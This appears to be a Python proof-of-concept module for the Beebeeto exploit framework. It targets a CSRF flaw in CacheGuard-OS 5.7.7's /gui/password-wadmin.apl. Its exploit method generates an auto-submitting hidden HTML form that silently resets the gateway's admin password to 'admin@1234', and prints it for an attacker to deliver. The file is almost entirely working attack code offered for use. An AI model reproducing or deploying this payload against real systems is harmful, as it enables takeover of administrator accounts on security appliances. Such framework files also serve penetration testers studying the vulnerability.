#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0112',
            'name': 'CacheGuard-OS 5.7.7 /gui/password-wadmin.apl CSRF Exploit',
            'author': 'tmp',
            'create_date': '2014-10-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [8090],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'CacheGuard',
            'vul_version': ['5.7.7'],
            'type': 'Cross Site Request Forgery',
            'tag': ['CacheGuard漏洞', 'CSRF', '/gui/password-wadmin.apl'],
            'desc': '''
                    CacheGuard is an All-in-One Web Security Gateway providing firewall,
                    web antivirus, caching, compression, URL filtering, proxy, high
                    availability, content filtering, bandwidth saving, bandwidth shaping,
                    Quality of Service and more.
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-87259',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + '/gui/password-wadmin.apl'
        if args['options']['verbose']:
            print '[*] Generation: ' + verify_url
        temp = '''
        <html>
        <body onload="CSRF.submit();">
        <br>
        <br>
        <form id="CSRF" action="%s"
        method="post" name="CSRF">
        <input name="password1" value="admin@1234" type=hidden> </input>
        <input name="password2" value="admin@1234" type=hidden> </input>
        </form>
        </body>
        </html>
        ''' % verify_url
        print '[*] Copy code: ' + temp
        print '[*] Specific use: ' + str(MyPoc.poc_info['vul']['references'])
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok'
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())